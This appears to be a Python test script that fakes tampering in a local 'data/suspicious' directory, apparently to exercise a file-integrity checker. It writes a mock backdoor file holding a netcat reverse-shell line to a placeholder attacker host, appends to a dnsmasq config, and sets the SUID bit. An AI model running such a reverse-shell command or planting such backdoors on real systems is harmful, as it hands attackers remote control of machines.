"""
Simulates a realistic, deliberate "attack" on data/suspicious:
1. Adds a new backdoor file
2. Modifies an existing configuration file
3. Applies a suspicious permission change (adds SUID)
"""
import os
import stat

suspicious_dir = "data/suspicious"

# 1. Add backdoor file
backdoor_path = os.path.join(suspicious_dir, "usr/bin/update_service")
os.makedirs(os.path.dirname(backdoor_path), exist_ok=True)
with open(backdoor_path, "w") as f:
    f.write("#!/bin/sh\n# hidden backdoor: reverse_shell connection\nnc -e /bin/sh attacker.example.com 4444\n")
print(f"Backdoor added: {backdoor_path}")

# 2. Modify an existing file
target_file = os.path.join(suspicious_dir, "etc/dnsmasq.conf")
if os.path.exists(target_file):
    with open(target_file, "a") as f:
        f.write("\n# unauthorized modification\n")
    print(f"Modified: {target_file}")
else:
    print(f"Warning: {target_file} not found, skipped")

# 3. Suspicious permission change (add SUID bit)
if os.path.exists(backdoor_path):
    current_mode = os.stat(backdoor_path).st_mode
    os.chmod(backdoor_path, current_mode | stat.S_ISUID | stat.S_IXUSR)
    print(f"SUID permission added: {backdoor_path}")

print("\nSimulation complete.")